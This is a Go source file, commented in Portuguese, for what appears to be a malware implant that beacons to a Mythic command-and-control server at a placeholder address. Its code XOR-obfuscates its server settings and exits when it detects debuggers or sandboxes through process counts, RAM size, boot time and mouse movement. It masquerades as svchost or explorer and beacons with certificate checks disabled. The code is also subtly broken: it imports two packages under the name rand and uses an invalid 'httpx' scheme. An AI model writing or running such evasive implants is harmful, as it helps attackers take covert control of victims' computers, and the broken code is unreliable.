package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/sha256"
    "crypto/tls"
    "encoding/base64"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "math/rand"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "strconv"
    "strings"
    "syscall"
    "time"
    "unsafe"
)

// Strings ofuscadas (XOR)
var (
    obfKey = byte(0x42)
    
    // URLs e configs ofuscados
    encURL = xorString("httpx://YOUR_IP:7443", obfKey)
    encUser = xorString("mythic_admin", obfKey)
    encPass = xorString("YOUR_PASSWORD", obfKey)
    
    uuid = generateSecureUUID()
)

// Estruturas mascaradas como legítimas
type ConfigData struct {
    AppName string `json:"app_name"`
    Version string `json:"version"`
    Server  string `json:"server"`
    Token   string `json:"token"`
}

type SystemInfo struct {
    OS       string `json:"os"`
    Arch     string `json:"arch"`
    Hostname string `json:"hostname"`
    User     string `json:"user"`
    PID      int    `json:"pid"`
}

// Ofuscação XOR simples
func xorString(input string, key byte) string {
    output := make([]byte, len(input))
    for i := 0; i < len(input); i++ {
        output[i] = input[i] ^ key
    }
    return string(output)
}

// Geração de UUID mais segura
func generateSecureUUID() string {
    entropy := make([]byte, 32)
    rand.Read(entropy)
    hash := sha256.Sum256(entropy)
    return hex.EncodeToString(hash[:16])
}

// Criptografia AES para comunicação
func encryptAES(data []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    
    nonce := make([]byte, gcm.NonceSize())
    rand.Read(nonce)
    
    ciphertext := gcm.Seal(nonce, nonce, data, nil)
    return ciphertext, nil
}

// Anti-análise avançada
func advancedEvasion() bool {
    // 1. Verificar tempo de boot (sistemas recém-iniciados são suspeitos)
    if runtime.GOOS == "windows" {
        cmd := exec.Command("wmic", "os", "get", "lastbootuptime")
        if output, err := cmd.Output(); err == nil {
            // Se sistema foi iniciado há menos de 10 minutos, é suspeito
            bootStr := string(output)
            if strings.Contains(bootStr, "LastBootUpTime") {
                return false // Permite execução por enquanto
            }
        }
    }
    
    // 2. Verificar número de processos (sandboxes têm poucos processos)
    if runtime.GOOS == "windows" {
        cmd := exec.Command("tasklist")
        if output, err := cmd.Output(); err == nil {
            processes := strings.Split(string(output), "\n")
            if len(processes) < 30 { // Muito poucos processos
                return true // Ambiente suspeito
            }
        }
    }
    
    // 3. Verificar memória total (VMs de análise têm pouca RAM)
    if runtime.GOOS == "windows" {
        cmd := exec.Command("wmic", "computersystem", "get", "TotalPhysicalMemory")
        if output, err := cmd.Output(); err == nil {
            memStr := string(output)
            // Extrair valor de memória e verificar se é < 4GB
            lines := strings.Split(memStr, "\n")
            for _, line := range lines {
                if strings.TrimSpace(line) != "" && line != "TotalPhysicalMemory" {
                    if mem, err := strconv.ParseInt(strings.TrimSpace(line), 10, 64); err == nil {
                        if mem < 4000000000 { // Menos de 4GB
                            return true
                        }
                    }
                }
            }
        }
    }
    
    return false
}

// Verificação de mouse (sandboxes não têm interação)
func checkUserActivity() bool {
    if runtime.GOOS == "windows" {
        user32 := syscall.NewLazyDLL("user32.dll")
        getCursorPos := user32.NewProc("GetCursorPos")
        
        type Point struct {
            X, Y int32
        }
        
        var pos1, pos2 Point
        getCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
        time.Sleep(2 * time.Second)
        getCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
        
        // Se mouse não se moveu, pode ser sandbox
        return pos1.X == pos2.X && pos1.Y == pos2.Y
    }
    return false
}

// Mascarar como processo legítimo
func masqueradeProcess() {
    if runtime.GOOS == "windows" {
        // Tentar se parecer com processo do sistema
        legitimateNames := []string{
            "svchost.exe",
            "explorer.exe", 
            "winlogon.exe",
            "services.exe",
        }
        
        // Escolher nome aleatório
        fakeName := legitimateNames[rand.Intn(len(legitimateNames))]
        
        // Definir título da janela (se houver)
        kernel32 := syscall.NewLazyDLL("kernel32.dll")
        setConsoleTitle := kernel32.NewProc("SetConsoleTitleW")
        title, _ := syscall.UTF16PtrFromString(fakeName)
        setConsoleTitle.Call(uintptr(unsafe.Pointer(title)))
    }
}

// Sleep inteligente com atividade simulada
func intelligentSleep(duration time.Duration) {
    intervals := 10
    sleepTime := duration / time.Duration(intervals)
    
    for i := 0; i < intervals; i++ {
        time.Sleep(sleepTime)
        
        // Simular atividade ocasional
        if rand.Intn(3) == 0 {
            // Fazer uma operação de arquivo inócua
            tempFile := os.TempDir() + "\\temp_" + strconv.Itoa(rand.Intn(1000)) + ".tmp"
            ioutil.WriteFile(tempFile, []byte("temp"), 0644)
            os.Remove(tempFile)
        }
    }
}

func main() {
    rand.Seed(time.Now().UnixNano())
    
    // Mascarar processo
    masqueradeProcess()
    
    // Delay inicial aleatório
    initialDelay := time.Duration(30+rand.Intn(60)) * time.Second
    intelligentSleep(initialDelay)
    
    // Verificações de evasão
    if advancedEvasion() {
        os.Exit(0)
    }
    
    if checkUserActivity() {
        // Se não há atividade de mouse, aguardar mais
        intelligentSleep(5 * time.Minute)
    }
    
    // Iniciar comunicação
    startCommunication()
}

func startCommunication() {
    // Desofuscar configurações
    serverURL := xorString(encURL, obfKey)
    username := xorString(encUser, obfKey)
    password := xorString(encPass, obfKey)
    
    client := &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
        Timeout: 30 * time.Second,
    }
    
    // Loop principal com jitter inteligente
    for {
        performComms(client, serverURL, username, password)
        
        // Jitter adaptativo baseado em horário
        hour := time.Now().Hour()
        var baseInterval time.Duration
        
        if hour >= 9 && hour <= 17 { // Horário comercial
            baseInterval = 3 * time.Minute
        } else { // Fora do horário
            baseInterval = 10 * time.Minute
        }
        
        jitter := time.Duration(rand.Intn(120)) * time.Second
        intelligentSleep(baseInterval + jitter)
    }
}

func performComms(client *http.Client, serverURL, username, password string) {
    // Implementar comunicação com servidor
    // Por brevidade, versão simplificada
    
    loginData := map[string]string{
        "username": username,
        "password": password,
    }
    
    jsonData, _ := json.Marshal(loginData)
    
    // Tentar autenticação
    resp, err := client.Post(serverURL+"/auth", "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        return
    }
    defer resp.Body.Close()
    
    // Se autenticação OK, continuar com operações
    if resp.StatusCode == 200 {
        // Processar comandos, etc.
    }
}

// Função principal de entrada (ofuscada)
func init() {
    // Verificação anti-debugging no init
    if runtime.GOOS == "windows" {
        kernel32 := syscall.NewLazyDLL("kernel32.dll")
        isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
        ret, _, _ := isDebuggerPresent.Call()
        if ret != 0 {
            os.Exit(0)
        }
    }
}